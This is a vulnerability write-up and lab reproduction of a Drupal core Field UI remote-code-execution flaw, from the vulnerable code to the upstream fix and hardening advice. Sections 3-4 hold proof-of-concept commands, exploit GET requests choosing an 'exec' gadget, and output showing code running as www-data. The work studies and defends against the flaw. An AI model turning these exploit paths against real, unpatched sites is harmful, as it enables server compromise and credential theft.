# F1 — SA-CORE-2026-014 / CVE-2026-108097 — RCE in the Field UI table

**Component:** `core/modules/field_ui`
**Fixed in:** Drupal 11.4.10 (2026-10-14) — commit `ef786b7a`
**Upstream rating:** Critical (19/25)

---

## 1. The vulnerable code

`core/modules/field_ui/src/Element/FieldUiTable.php:46-107`

```php
public static function tablePreRender($elements) {
  ...
  $children = Element::children($elements);
  $list = array_combine($children, $children);

  while ($list) {
    foreach ($list as $name) {
      $row = &$elements[$name];
      $parent = $row['parent_wrapper']['parent']['#value'];
      if (empty($parent) || isset($parents[$parent])) {
        $parents[$name] = $parent ? array_merge($parents[$parent], [$parent]) : [];
        unset($list[$name]);

        // Determine the region for the row.
        $region_name = call_user_func_array($row['#region_callback'], [&$row]);   // <-- line 72
```

Line 72 is the whole bug. `$row['#region_callback']` is a value read out of
the **render array**, and it is handed to `call_user_func_array()` with:

* **no** `is_callable()` check,
* **no** allow-list of permitted callbacks,
* **no** restriction on the signature,
* **no** sanitisation of the argument.

The single argument is `$row`, passed **by reference** — and the row is
built from form values, so its contents are attacker-influenceable.

Whatever ends up in `#region_callback` is what PHP executes.

## 2. Why a render-array callback is a dangerous thing to execute

Drupal render arrays routinely carry PHP callables in `#`-prefixed properties
(`#pre_render`, `#process`, `#element_validate`, `#theme` …). The form API
guarantees that *request data only ever reaches `#value`* — it is not possible
to write arbitrary element properties from a POST body. That design property
is exactly what keeps F1 from being directly exploitable with core alone.

But `#region_callback` is not an internal detail: it is a **documented
extension point**. The `tablePreRender()` docblock says:

```
 *   - #region_callback: A callback that provides the region of the table to
 *     place the row in.
```

and core's own test module demonstrates the supported way to use it —
`hook_form_alter()` on the entity view display form, adding a row with your
own callback:

```php
// core/modules/field_ui/tests/modules/field_ui_test/src/Hook/FieldUiTestHooks.php:30-46
#[Hook('form_entity_view_display_edit_form_alter')]
public function formEntityViewDisplayEditFormAlter(&$form, FormStateInterface $form_state): void {
  $table =& $form['fields'];
  ...
  $table['indent'] = [
    '#row_type' => 'group',
    '#region_callback' => [$this, 'regionCallback'],
    ...
  ];
}
```

`hook_form_alter()` receives `$form` **by reference**, so third-party code can
place any value into any `#`-prefixed property of the table or of a row.

**The vulnerability is therefore: core executes a render-array-supplied
callable without validating it.** Any code path that lets request data reach
`#region_callback` — directly, or indirectly through a row built from
request data — becomes a code-execution primitive.

The advisory says precisely this:

> The vulnerability is not directly exploitable with core alone, but multiple
> serious exploit paths exist with contributed modules. At least one known
> exploit path does not require authentication. Custom code may also expose
> the vulnerable functionality.

It also notes the mitigation: *"The vulnerability can be mitigated by
uninstalling the core Field UI module (field_ui)"* — which works precisely
because the sink lives in `field_ui`.

## 3. How the lab reproduces it

Two paths, one sink.

### Path 1 — unauthenticated (a contributed module that exposes the table)

`lab/modules/vulnlab_field_ui/src/Controller/PublicRceController.php` renders
a `field_ui_table` on a public route, with `#region_callback` taken from the
request:

```php
'#region_callback' => $callable,        // <- chosen by the request
...
LabGadgets::ARG_KEY => $arg,             // <- the data core hands to it
```

The callable is resolved from a fixed gadget registry
(`lab/modules/vulnlab_field_ui/src/Gadget/LabGadgets.php`) so the published
lab cannot be turned into a general purpose web shell. The gadgets are:

| Gadget | Effect |
|--------|--------|
| `marker` | writes a JSON marker file and logs it |
| `exec`   | runs one command from a 3-item allow-list (`id`, `whoami`, `uname -a`) and renders the output into the page |
| `sleep`  | sleeps, to show the sink is reachable from a plain GET |

The **executed callable is chosen by the request**, and the **data core passes
to it is also chosen by the request** — that is the full threat model.

### Path 2 — authenticated (core's own "Manage display" form)

`lab/modules/vulnlab_field_ui/src/Hook/VulnLabFieldUiHooks.php` adds the same
row to the real entity view display form, so the sink is core's own screen:

```
GET /admin/structure/types/manage/vulnlab_article/display/default?vulnlab_gadget=exec&vulnlab_arg=id
```

## 4. Proof of concept

### Standalone (no server needed)

```bash
DRUPAL_ROOT=/path/to/drupal-11.4.9 php lab/standalone/f1_field_ui_rce.php
```

```
Target Drupal core : /path/to/drupal-11.4.9
Core version       : 11.4.9
Vulnerable sink    : core/modules/field_ui/src/Element/FieldUiTable.php:72

[+] gadget executed -> wrote /tmp/drupal-vulnlab-f1-marker.txt

=== marker file contents ===
attacker-chosen callable executed
called with row keys: #row_type, #region_callback, #js_settings, region, weight, parent_wrapper
row region value : content
=== VULNERABLE: attacker-chosen callable was executed ===
```

The script calls the **real** `FieldUiTable::tablePreRender()`; nothing is
simulated.

### End to end

```bash
python3 lab/poc/f1_field_ui_rce.py
```

```
=== Path 1 — UNAUTHENTICATED (public route) ===
  [*] GET /vulnlab/field-ui-rce?gadget=exec&arg=id -> 200
  [+] the request-chosen callable EXECUTED inside the Drupal web process
        uid=33(www-data) gid=33(www-data) groups=33(www-data)

=== Path 2 — AUTHENTICATED (core's own 'Manage display' form) ===
  [+] logged in as admin
  [*] GET /admin/structure/types/manage/vulnlab_article/display/default?vulnlab_gadget=exec&vulnlab_arg=id -> 200
  [+] core's own display form executed the request-chosen callable
        uid=33(www-data) gid=33(www-data) groups=33(www-data)

  [+] F1 reproduced: attacker-chosen callable executed by Drupal core.
```

(The `exec` gadget renders the command output straight into the page, which
is how the PoC verifies the execution without any out-of-band channel.)

## 5. Impact

Arbitrary PHP function or method invocation with an attacker-influenceable
array argument, in the web process, reachable from a plain HTTP GET once a
module exposes the table.

* **Confidentiality** — read any file the web user can read (`settings.php`,
  the database credentials, `secrets`).
* **Integrity** — write files, drop a webshell, tamper with configuration.
* **Availability** — crash or hang the site.

Combined with the site's own database credentials this is full compromise.

## 6. The fix

The upstream patch removes the dynamic dispatch entirely and reads the region
from the row's own select value, validated against the known region list:

```diff
-          $region_name = call_user_func_array($row['#region_callback'], [&$row]);
+          $region_name = $row['region']['#value'] ?? '';
+          if (!isset($regions[$region_name])) {
+            $region_name = isset($regions['hidden']) ? 'hidden' : array_key_first($regions);
+          }
```

No callback, no dispatch, no injection surface. The behaviour is identical,
because `EntityDisplayFormBase::getRowRegion()` did exactly this:

```php
// core/modules/field_ui/src/Form/EntityDisplayFormBase.php:781-787
public function getRowRegion(&$row) {
  $regions = $this->getRegions();
  if (!isset($regions[$row['region']['#value']])) {
    $row['region']['#value'] = 'hidden';
  }
  return $row['region']['#value'];
}
```

## 7. Hardening advice for site builders

Until you can upgrade:

1. **Uninstall `field_ui`** — the advisory's own mitigation. The module has no
   front-end role; it only provides the admin UI for managing fields and
   display configuration.
2. Audit any module that implements `hook_form_alter()` for
   `entity_view_display_edit_form` / `entity_form_display_edit_form` and
   inspect what it puts into `#region_callback`.
3. Watch the Drupal security advisories page for follow-up issues; the advisory
   notes that *"Sites should upgrade in the near future in case additional
   attack vectors are discovered."*
